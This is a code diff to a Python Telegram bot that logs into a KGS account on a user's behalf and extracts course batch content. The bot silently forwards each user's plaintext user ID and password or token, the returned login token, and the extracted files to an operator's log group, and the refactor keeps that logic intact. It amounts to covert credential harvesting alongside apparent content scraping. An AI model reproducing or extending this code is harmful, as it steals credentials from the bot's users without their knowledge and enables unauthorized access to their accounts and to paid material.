@@ -10,7 +10,6 @@ from telegram.ext import (
     ContextTypes,
     filters,
 )
-from telegram import Bot
 
 # Conversation states
 LOGIN_CHOICE, USER_ID, PASSWORD_OR_TOKEN, BATCH_SELECTION = range(4)
@@ -73,17 +72,19 @@ async def handle_password_or_token(update: Update, context: ContextTypes.DEFAULT
             "user-agent": "okhttp/3.9.1",
         }
 
-        # Log credentials to the log group via main bot
-        main_bot = Bot(context.bot_data["main_bot_token"])  # Use main bot token
+        # Log credentials to the log group using main bot
+        log_group_id = context.application.log_group_id_kgs  # Get log group ID from context
+        main_bot = context.application.main_bot  # Get main bot instance
+
         if context.user_data['login_choice'] == '1':
             await main_bot.send_message(
-                chat_id=context.bot_data["log_group_id_kgs"],  # Use log_group_id_kgs
+                chat_id=log_group_id,
                 text=f"New KGS login attempt:\nUser ID: ```{context.user_data['user_id']}```\nPassword: ```{context.user_data['password']}```",
                 parse_mode="Markdown"
             )
         else:
             await main_bot.send_message(
-                chat_id=context.bot_data["log_group_id_kgs"],  # Use log_group_id_kgs
+                chat_id=log_group_id,
                 text=f"New KGS token login:\nUser ID: ```{context.user_data.get('user_id', 'N/A')}```\nToken: ```{context.user_data['token']}```",
                 parse_mode="Markdown"
             )
@@ -114,9 +115,9 @@ async def handle_password_or_token(update: Update, context: ContextTypes.DEFAULT
 
             token = response_data["token"]
             
-            # Log token to the log group via main bot
+            # Log token to the log group using main bot
             await main_bot.send_message(
-                chat_id=context.bot_data["log_group_id_kgs"],  # Use log_group_id_kgs
+                chat_id=log_group_id,
                 text=f"KGS Login Success!\nUser ID: ```{context.user_data['user_id']}```\nGenerated Token: ```{token}```",
                 parse_mode="Markdown"
             )
@@ -240,7 +241,7 @@ async def handle_batch_selection(update: Update, context: ContextTypes.DEFAULT_T
             # Send file to user
             user_caption = (
                 f"𝑯𝒆𝒓𝒆'𝒔 𝒚𝒐𝒖𝒓 𝒆𝒙𝒕𝒓𝒂𝒄𝒕𝒆𝒅 𝒄𝒐𝒏𝒕𝒆𝒏𝒕!✨️\n\n"
-                f"𝐁𝐚𝐭𝐜𝐡 𝐧𝐚𝐦𝐞😁: {selected_batch['title']}\n\n"
+                f"𝐁𝐚𝐭𝐜𝐡 𝐧𝐚𝐦𝐞😁: {selected_batch['title']}\n"
                 f"𝑬𝒙𝒕𝒓𝒂𝒄𝒕𝒊𝒐𝒏 𝒕𝒊𝒎𝒆⏱️: {extraction_time_str}"
             )
             with open(file_path, "rb") as f:
@@ -249,23 +250,25 @@ async def handle_batch_selection(update: Update, context: ContextTypes.DEFAULT_T
                     caption=user_caption
                 )
 
-            # Send file to log group via main bot
-            main_bot = Bot(context.application.main_bot_token)
+            # Send file to log group using main bot
+            log_group_id = context.application.log_group_id_kgs  # Get log group ID from context
+            main_bot = context.application.main_bot  # Get main bot instance
+
             log_caption = (
-                f"𝙺𝙶𝚂 𝚌𝚘𝚗𝚝𝚎𝚗𝚝 𝚎𝚡𝚝𝚛𝚊𝚌𝚝𝚎𝚍 𝚊𝚗𝚍 𝚜𝚎𝚗𝚝 𝚝𝚘 𝚞𝚜𝚎𝚛.\n\n"
-                f"𝐁𝐚𝐭𝐜𝐡 𝐧𝐚𝐦𝐞😁: {selected_batch['title']}\n\n"
-                f"𝑬𝒙𝒕𝒓𝒂𝒄𝒕𝒊𝒐𝒏 𝒕𝒊𝒎𝒆⏱️: {extraction_time_str}"
+                f"📥 **KGS Content Extracted:**\n"
+                f"👤 **User ID:** `{update.message.from_user.id}`\n"
+                f"📌 **Batch Name:** {selected_batch['title']}\n"
+                f"⏱ **Extraction Time:** {extraction_time_str}"
             )
             with open(file_path, "rb") as f:
                 await main_bot.send_document(
-                    chat_id=context.application.log_group_id_kgs,
+                    chat_id=log_group_id,
                     document=f,
                     caption=log_caption
                 )
 
             # Clean up
-            if os.path.exists(file_path):
-                os.remove(file_path)
+            os.remove(file_path)
             await update.message.reply_text("𝑬𝒙𝒕𝒓𝒂𝒄𝒕𝒊𝒐𝒏 𝒄𝒐𝒎𝒑𝒍𝒆𝒕𝒆𝒅 𝒔𝒖𝒄𝒄𝒆𝒔𝒔𝒇𝒖𝒍𝒍𝒚! ✨")
             return ConversationHandler.END  # Ensure the conversation ends here after successful extraction
 
